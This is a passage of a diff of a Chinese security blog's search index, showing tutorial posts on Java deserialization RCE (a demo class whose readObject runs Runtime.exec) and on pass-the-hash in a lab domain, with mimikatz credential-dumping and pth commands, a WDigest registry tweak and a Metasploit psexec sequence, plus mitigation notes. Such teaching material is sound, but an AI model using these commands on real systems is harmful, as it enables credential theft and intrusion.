class="string">&quot;的EvilClass()无参构造方法被调用!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用法和实现了<code>Serializable</code>接口一样，这里就不演示了。</p>
+<h2 id="0x04-readObject-方法"><a href="#0x04-readObject-方法" class="headerlink" title="0x04 readObject()方法"></a>0x04 readObject()方法</h2><p>特地提到这个方法是因为在反序列化漏洞中它起到了关键作用。因为在序列化过程中，JVM虚拟机会试图调用对象类里的 <code>writeObject</code> 和 <code>readObject</code> 方法，进行用户自定义的序列化和反序列化，如果没有这样的方法，则默认调用是 <code>ObjectOutputStream</code> 的 <code>defaultWriteObject</code> 方法以及 <code>ObjectInputStream</code> 的 <code>defaultReadObject</code> 方法。用户自定义的 <code>writeObject</code> 和 <code>readObject</code> 方法可以允许用户控制序列化的过程，比如可以在序列化的过程中动态改变序列化的数值。 </p>
+<blockquote>
+<p>  Java反序列化的过程中可以自动执行序列化类的四个方法，实现了<code>Serializable</code>接口可以执行的方法包括<code>readObject</code>、<code>readObjectNoData</code>、<code>readResolve</code>，以及实现了<code>Externalizable</code>接口的<code>readExternal</code>方法。这些在找反序列化漏洞时都需要重点关注。</p>
+</blockquote>
+<p>如果<code>readObject</code>方法书写不当的话就有可能引发恶意代码的执行，例如</p>
+<p><strong>基本类</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 23:34</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.getClass() + <span class="string">&quot;的EvilClass()无参构造方法被调用!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilClass</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.getClass() + <span class="string">&quot;的EvilClass(String name)构造方法被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.getClass() + <span class="string">&quot;的getName被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.getClass() + <span class="string">&quot;的setName被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.getClass() + <span class="string">&quot;的toString()被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;EvilClass&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + getName() + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.getClass() + <span class="string">&quot;的readObject()被调用!!!!!!&quot;</span>);</span><br><span class="line">        <span class="comment">// windows</span></span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;, name&#125;);</span></span><br><span class="line">        <span class="comment">// mac</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;-a&quot;</span>, name&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>readObject</code>中存在执行命令的代码<code>Runtime.getRuntime().exec(new String[]&#123;&quot;open&quot;, &quot;-a&quot;, name&#125;)</code>，name参数是要执行的命令。那么我们可以构造一个恶意的对象，将其name属性赋值为要执行的命令，当反序列化触发<code>readObject</code>时就会RCE。如下</p>
+<p><strong>序列化和反序列化</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 23:36</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilSerialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        EvilClass evilObj = <span class="keyword">new</span> EvilClass();</span><br><span class="line"><span class="comment">//        evilObj.setName(&quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">// mac</span></span><br><span class="line">        evilObj.setName(<span class="string">&quot;Calculator&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化为字节数组</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = serializeToBytes(evilObj);</span><br><span class="line">	<span class="comment">// 反序列化</span></span><br><span class="line">        EvilClass o = (EvilClass)deserializeFromBytes(bytes);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serializeToBytes(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">final</span> ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        objOut.flush();</span><br><span class="line">        objOut.close();</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">deserializeFromBytes</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> ByteArrayInputStream in = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        <span class="keyword">final</span> ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210405211527.png" alt="image-20210405000541157"></p>
+<p>这是一个极端的例子，在真实场景中，不会有人真的这样直接写一句执行命令的代码在readObject()中，这样写的开发绝对会被拉出去祭天的。所以反序列化漏洞通常会需要Java的一些特性进行配合比如<code>反射(invoke)</code>。然后就是利用链的寻找。反序列化漏洞需要三个东西</p>
 <ol>
-<li><p><code>/WEB-INF/applicationContext-slave.xml </code>目录 ，必有</p>
-</li>
-<li><p><code>&#123;tag=&quot;&lt;?xml&quot;&#125; </code>可选， 如果有的话，会比对 response.text ,即返回的html页面中是否存在tag，若没有，认为不存在该目录。</p>
-</li>
-<li><p><code>&#123;status=200&#125; </code>可选， 目录对应的状态码， 也是 作为判断该目录是否存在的一个条件，会比对页面的状态码和规则的状态码一致 </p>
-</li>
-<li><p><code>&#123;type=&quot;xml&quot;&#125;</code> 可选，与返回头信息 content-type 字段比对，也是判断目录存在的一个条件</p>
-</li>
-<li><p><code>&#123;root_only&#125;</code> 可选， 这个是表示该目录只在网站根目录下存在，之后与网站根目录拼接，进行检测，比如 <a href="https://www.baidu.com/WEB-INF/applicationContext-slave.xml">https://www.baidu.com/WEB-INF/applicationContext-slave.xml</a> 这样检查一次， 在 <a href="https://www.baidu.com/test/">https://www.baidu.com/test/</a> 这样的二级目录，并不会拼接检查，提高效率 ，</p>
-<p> ps：必有：是指当想要自己添加规则时，必须添加的字段，可选：可以没有，但想要更加准确，最好写上。</p>
-<p> 具体匹配检测在<code>lib/common/scanner.py</code> 的523行</p>
-</li>
+<li> 反序列化入口(source)</li>
+<li> 目标方法(sink)</li>
+<li> 利用链(gadget chain)</li>
 </ol>
-</li>
-</ul>
-<h2 id="如何编写脚本插件"><a href="#如何编写脚本插件" class="headerlink" title="如何编写脚本插件"></a>如何编写脚本插件</h2><p>请参考scripts文件夹下的插件内容。self参数是一个Scanner对象(lib/common/scanner.py)，可使用Scanner对象的任意方法、属性。</p>
-<p><code>self.host</code> <code>self.port</code> 是目标主机和端口</p>
-<p><code>self.ports_open</code> 是开放的端口列表，是所有插件共享的。 一般不在插件执行过程中再单独扫描端口</p>
-<p><code>self.session</code> 是HTTP连接池</p>
-<p><code>self.http_request</code> 可发起HTTP GET请求</p>
-<p><code>self.index_headers</code> <code>self.index_status</code> <code>self.index_html_doc</code> 是请求首页后返回的，一旦扫描器发现有插件依赖，会预先请求首页，保存下来，被所有插件公用</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="https://github.com/lijiejie/BBScan.git">BBScan</a></li>
-<li><a href="https://github.com/shmilylty/OneForAll.git">oneforall</a> </li>
-<li><a href="https://github.com/sting8k/BurpSuite_403Bypasser">BurpSuite_403Bypasser</a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247489824&idx=1&sn=83d370a391fa8269c12848d87a62240a&chksm=9b393f91ac4eb687328e676b3ed0710078d5cb2d3185e0d38d5e7bd92403840d0fc224b443ba&mpshare=1&scene=24&srcid=12289jnCaJEnQZ4ZGqKk1uGX&sharer_sharetime=1609151769170&sharer_shareid=6806da86371afa965c2b99ffa8f84bab#rd">记一次403绕过技巧</a></li>
-<li><a href="http://www.langzi.fun/Asyncio%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B.html">Asyncio并发编程</a></li>
-<li><a href="https://github.com/test502git/Scanunauthorized">Scanunauthorized</a></li>
-<li><a href="https://github.com/timwhitez/Frog-Auth/blob/main/pocs/pocs.py">Frog-Auth</a></li>
-</ul>
-<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。<br>    如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。<br>    除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。<br>    您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>
-<h2 id="Star趋势"><a href="#Star趋势" class="headerlink" title="Star趋势"></a>Star趋势</h2><p><a href="https://starchart.cc/yhy0/SScan"><img src="https://starchart.cc/yhy0/SScan.svg" alt="Stargazers over time"></a>
-      </p>
+<p>大佬们基本都会去寻找重写了这个<code>readObject</code>方法的类，并配合Java的<code>invoke</code>反射机制，构造利用链，形成了Java中最具特色的反序列化攻击。而且再看上图中的输出结果，不仅仅触发了<code>readObject</code>方法，还触发了<code>toString()</code>、<code>无参构造</code>、<code>set</code>、<code>get</code>方法，那么在实际寻找利用链的过程中就不仅仅需要关注<code>readObject()</code>的方法了。</p>
+<p>代码地址：<a href="https://github.com/yhy0/JavaSerializeDemo">https://github.com/yhy0/JavaSerializeDemo</a></p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p>Java反序列之从萌新到菜鸟 <a href="https://www.kingkk.com/2019/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BB%8E%E8%90%8C%E6%96%B0%E5%88%B0%E8%8F%9C%E9%B8%9F/">https://www.kingkk.com/2019/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BB%8E%E8%90%8C%E6%96%B0%E5%88%B0%E8%8F%9C%E9%B8%9F/</a> </p>
+<p>Java反序列化技术分享 <a href="https://github.com/Y4er/WebLogic-Shiro-shell">https://github.com/Y4er/WebLogic-Shiro-shell</a> </p>
 ]]></content>
       <categories>
-        <category>GitHub工具</category>
+        <category>漏洞原理</category>
       </categories>
       <tags>
-        <tag>GitHub工具</tag>
+        <tag>漏洞原理</tag>
       </tags>
   </entry>
   <entry>
@@ -965,45 +1162,58 @@
       </tags>
   </entry>
   <entry>
-    <title>Java反序列化漏洞分析(二)-Shiro550</title>
-    <url>/2021/05/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%BA%8C)-Shiro550/</url>
+    <title>哈希传递</title>
+    <url>/2021/02/14/%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<blockquote>
-<p>  这是一篇失败的文章，要学的东西太多了，高看我自己了。终究是纸上得来终觉浅，绝知此事要躬行</p>
+<p>  笙歌间错华筵启。喜新春新岁。菜传纤手青丝细。和气入、东风里。</p>
+<p>  幡儿胜儿都姑媂。戴得更忔戏。愿新春以后，吉吉利利，百事都如意。 </p>
 </blockquote>
-<h2 id="0x00-纠错"><a href="#0x00-纠错" class="headerlink" title="0x00 纠错"></a>0x00 纠错</h2><p>首先纠正一下上篇文章<a href="">Java反序列化漏洞分析(一)-Shiro550</a>的错误错误，上篇提到dnslog使用原生环境搭建没有打成功，这是<strong>错的</strong>、<strong>错的</strong>、<strong>错的</strong>，其实是可以打的。我给搞错了，<strong>URLDNS</strong> 这个利用链本身不依赖于任何第三方库，同时不限制jdk的版本，所以通常是用来检测反序列化的点（目标出网），我当时没打成功，是因为我做实验时，用了<strong>同一条</strong>dnslog的url打过一遍，第二遍死活不出结果，写这篇文章时又测了几次，发现是url的锅，要不停的变换才会一直出结果<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210524215703.png" alt="原生的shiro550可以使用dnslog探测"></p>
+<h2 id="0x01-哈希传递攻击概念"><a href="#0x01-哈希传递攻击概念" class="headerlink" title="0x01 哈希传递攻击概念"></a>0x01 哈希传递攻击概念</h2><p>在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。</p>
+<p>在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)。攻击者获得有效的用户名和用户密码哈希值后，他们便能够使用该信息通过LM或NTLM身份验证向远程服务器或服务进行身份验证，而无需进行<strong>暴力破解</strong>散列以获取明文密码（此技术发布之前需要此密码）。该攻击利用了身份验证协议中的一种实现缺陷，即每次<strong>会话之间</strong>的密码散列保持静态，直到下次更改密码为止。</p>
+<p>从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash。在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，只能读取哈希值。虽然此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<p>但是，这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。如果攻击者拥有用户密码的哈希值，则无需强行使用明文密码；他们可以简单地使用他们已经收获的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成它们的原始密码。</p>
+<p>因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</p>
+<h2 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h2><h3 id="环境搭配"><a href="#环境搭配" class="headerlink" title="环境搭配"></a>环境搭配</h3><p>域搭建可以参考<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483820&idx=1&sn=f49f393a5698e366df99ddd0d9269829&chksm=c28298b5f5f511a36cd92fb722ce3b0658a9ee6195f5ad3f89266a4dc2ac3f022fdc8d5b578e#rd">Windows组策略提权实验</a></p>
+<p>将一台win7添加到域控（win8）中</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160244.png" alt="image-20210214145116625"></p>
+<p>登录一下域账户，之后退出域账户，然后切换为本地账户</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160250.png" alt="image-20210214145726732"></p>
+<p>切换本地账户</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160257.png" alt="image-20210214145957319"></p>
+<h3 id="Mimikatz-交互式获取"><a href="#Mimikatz-交互式获取" class="headerlink" title="Mimikatz 交互式获取"></a>Mimikatz 交互式获取</h3><p>读取lsass进程的信息，获取hash</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160302.png" alt="image-20210214152209729"></p>
+<p>获取终端</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:4075bdc2e63781b034a034102356063a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160306.png" alt="image-20210214152128620"></p>
+<p>会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，可以直接访问smb服务，我们可以通过copy文件，然后执行计划任务去拿到shell（使用atexec攻击）。</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160310.png" alt="image-20210214152835360"></p>
+<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>需要使用<code>exploit/windows/smb/psexec</code></p>
+<p>注意这里填入的哈希是<code>LM Hash:NTLM Hash</code>, 当系统默认不支持LM hash，LM hash可以设定为任意值。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set RHOST 172.16.27.10</span><br><span class="line">set smbuser administrator</span><br><span class="line">set SMBPass 00000000000000000000000000000000:4075bdc2e63781b034a034102356063a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160316.png" alt="image-20210214154108503"></p>
+<p>当然还有一些其它利用方法，比如：Cobalt Strike 抓取、powershell读取、 SAM表离线获取hash、wmiexec利用hash获取shell等等</p>
+<h2 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h2><h3 id="KB2871997补丁的影响"><a href="#KB2871997补丁的影响" class="headerlink" title="KB2871997补丁的影响"></a>KB2871997补丁的影响</h3><p>防范首先想到打补丁，微软也早在2014年5月发布了KB2871997补丁，该补丁禁止通过本地管理员权限与远程计算机进行连接，其后果就是：无法通过本地管理员权限对远程计算机使用Psexec、WMI、smbecec等，也无法访问远程的文件共享等。</p>
+<p>但实际上就算打了KB2871997补丁后，Administrator账号(SID为500)也是例外的，使用该账户的NTLM Hash依然可以进行哈希传递。</p>
 <blockquote>
-<p>  Java默认有TTL缓存，DNS解析会进行缓存，所以可能会出现第一次收到DNS的log，后面可能收不到的情况。</p>
+<p>  KB2871997补丁并不能真正防止哈希传递，只是在一定程度上缓解了PTH的问题。</p>
+<p>  浅探内网横向移动-Pass The Hash  <a href="https://xz.aliyun.com/t/8117#toc-11">https://xz.aliyun.com/t/8117#toc-11</a></p>
+<p>  KB22871997是否真的能防御PTH攻击？<a href="https://www.anquanke.com/post/id/193150">https://www.anquanke.com/post/id/193150</a></p>
 </blockquote>
-<h2 id="0x01-原生Shiro550执行命令"><a href="#0x01-原生Shiro550执行命令" class="headerlink" title="0x01 原生Shiro550执行命令"></a>0x01 原生Shiro550执行命令</h2><p>当使用<strong>URLDNS链</strong>打过去，在DNSLOG平台有回显的时候，就说明这个地方存在反序列化漏洞。</p>
-<p>但是要利用的话还得是使用CC链等利用链去进行命令的执行（shiro550中自带的是cc3.2.1版本的组件）。</p>
-<p>经过测试<strong>ysoserial</strong>拥有的CommonsCollections利用链从1-7都无法成功执行命令, 都是报错<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210529211912.png" alt="image-20210528211554019"></p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210529211926.png" alt="image-20210525211529910"></p>
-<p>无法反序列化一个数组，经常敲代码，修bug的都知道，报错的位置一般都在最下边的，去看看</p>
-<p><code>at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:77)</code> 直接点过去看看<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210529211917.png" alt="image-20210526220345069"></p>
-<p>可以看到在<a href="">初探Java反序列化漏洞(一)</a>中提到的重点函数<strong>readObject()<strong>函数，但是又有一点点不一样，它这里是</strong>new</strong>了一个<strong>ClassResolvingObjectInputStream</strong>,而非传统的<strong>ObjectInputStream</strong> 问题就可能出现在这里，全局搜索看下<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210529211939.png" alt="image-20210526220837880"></p>
-<p>这里是通过 <strong>ClassUtils.forName(osc.getName());<strong>来反射调用的，而前面都是通过</strong>Class.forName(“java.lang.Runtime”);</strong> 来进行反射执行命令的<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210529211949.png" alt="image-20210526221020003"></p>
-<p>直接在这里下断点，然后使用CC2链打一下，调试半天也没看懂，太菜了，先记下 参考文章中说的是</p>
-<blockquote>
-<p>  Shiro resovleClass 使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
-</blockquote>
-<p>别人在环境中引入了<code>commons-collections4.0</code>，使得ysoserial的<code>CommonsCollections2</code>利用链可以成功利用。这是因为<code>CommonsCollections2</code>用的是非数组形式的利用链，在该利用链上没有出现数组类型的对象，这使得在shiro的环境下，可以正确执行命令。（后续学习这条链）</p>
-<h2 id="0x01-构造新的利用链"><a href="#0x01-构造新的利用链" class="headerlink" title="0x01 构造新的利用链"></a>0x01 构造新的利用链</h2><p>我不会。。。 看半天还是没看懂，前置知识缺的有点多，直接放链接吧</p>
-<p><a href="https://www.anquanke.com/post/id/192619#h2-3">https://www.anquanke.com/post/id/192619#h2-3</a> </p>
-<p>总结就是利用链中的<code>ChainedTransformer</code>这个类的利用是无法成功的，因为它的类属性<code>iTransformers</code>是数组类型的<code>Transformers</code>，最终通过使用<code>TemplatesImpl.newTransformer</code>函数来动态<code>loadClass</code>构造好的evil class bytes</p>
-<p>通过大佬改造的<a href="https://github.com/wh1t3p1g/ysoserial">https://github.com/wh1t3p1g/ysoserial</a> CommonsCollections10 利用链打一下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210529212125.png" alt="image-20210527084745187"></p>
-<p>这个图<strong>又是假</strong>的，淦，用大佬的CC10链打了之后，突然怀疑之前的命令搞错了，我之前是用<code>whoami</code>测试的，我想起了mac命令执行不太一样，重新用<code>open -a Calculator</code>试了一遍，发现CC2链又可以成功了，瞬间凌乱（已经把添加的commons-collections4.0版本给注释了），这两天一直在重新测试找原因，通过重新下载shiro，切换版本重新来一遍，CC2并不可以打原生的shiro550，用大佬的CC10也打不出来，原因也找不到，前置知识缺的太多了，再搞下去也是浪费时间。</p>
-<p>最终找到我为啥可以打成功，因为我在<code>shiro/samples/web</code>目录下生成过war包，当时是在测试4.0版本RCE，生成的target目录没有删除，之后启动的时候应该都是使用target目录下的东西，即使去除4.0版本依旧没用，生成的war包并没有改变还是可以RCE的4.0版本，搞得我怀疑人生。还有说<strong>JRMP</strong> 这个<strong>Gadget</strong>可以打，也是废了，没成功。</p>
-<p>不搞了，心累，等补充完知识，再重新来吧</p>
-<p>接下来通过<a href="https://github.com/frohoff/ysoserial%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E5%90%A7%EF%BC%8C%E6%85%A2%E6%85%A2%E6%9D%A5%E5%90%A7%E3%80%82">https://github.com/frohoff/ysoserial这个项目来学习java反序列化的利用链吧，慢慢来吧。</a></p>
-<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p>推荐一个Chrome插件—<strong>Toby for Chrome</strong>，适合舍不得关标签页，留待后续研究的。</p>
-<p>中途参考的文章太多了，就用这个插件生成的分享链接吧</p>
-<p><a href="https://www.gettoby.com/p/m9955hzbsf6s">https://www.gettoby.com/p/m9955hzbsf6s</a></p>
+<h3 id="防御-mimikatz-攻击"><a href="#防御-mimikatz-攻击" class="headerlink" title="防御 mimikatz 攻击"></a>防御 mimikatz 攻击</h3><p>mimikatz在抓取散列值或明文密码时，需要用到Debug权限（因为mimikatz需要和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程里的密码）。而Debug权限归本地管理员Administrator所有,目的是确定哪些用户可以将调试器附加到任何进程或内核中，但一般Administrator不会用到这个权限(除非是系统进程)。<br><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160322.png" alt="image-20210214155950651"></p>
+<p>所以在配置用户权限时，可以将拥有Debug权限的本地管理员从Administrator组中移除。重启系统之后，在运行mimikatz，在第一步”privilege::debug”时就会报错了。</p>
 ]]></content>
       <categories>
-        <category>漏洞原理</category>
+        <category>域渗透</category>
       </categories>
       <tags>
-        <tag>漏洞原理</tag>
+        <tag>Windows提权</tag>
+        <tag>域渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -1117,141 +1327,6 @@
       </tags>
   </entry>
   <entry>
-    <title>令牌窃取分析及防范</title>
-    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
-    <content><![CDATA[<blockquote>
-<p>  快过年了，小伙伴们提议出去浪一下，决定要去玩恐怖类密室逃脱，瑟瑟发抖o((⊙﹏⊙))o.</p>
-</blockquote>
